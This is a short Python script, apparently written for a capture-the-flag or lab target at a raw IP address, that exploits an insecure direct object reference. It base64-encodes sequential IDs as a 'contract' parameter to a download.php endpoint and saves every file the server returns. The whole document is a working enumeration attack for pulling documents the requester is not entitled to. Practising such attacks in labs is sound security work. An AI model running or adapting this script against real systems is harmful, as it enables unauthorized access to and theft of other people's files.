import os
import requests
import base64

url = "http://94.237.60.55:48965/download.php"
output_dir = "docs2"

def encode_uids(id : str):
    uid_b64 = base64.b64encode(id.encode()).decode()
    params = {"contract": uid_b64}
    try:
        response = requests.get(url, params=params)
        if "file does not exist" in response.text.lower():
            print(response.text)
            return False
        filename = os.path.join(output_dir, f"{id}")
        with open(filename, "wb") as out:
            out.write(response.content)
        return True
    except requests.RequestException as e:
        print(f"[-] Error: {e}")

def main():
    os.makedirs(output_dir, exist_ok=True)
    for id in range(1,30):
        target = encode_uids(str(id))
        if target:
            print(f"[+] Found valid target {target}")

if __name__ == "__main__":
    main()
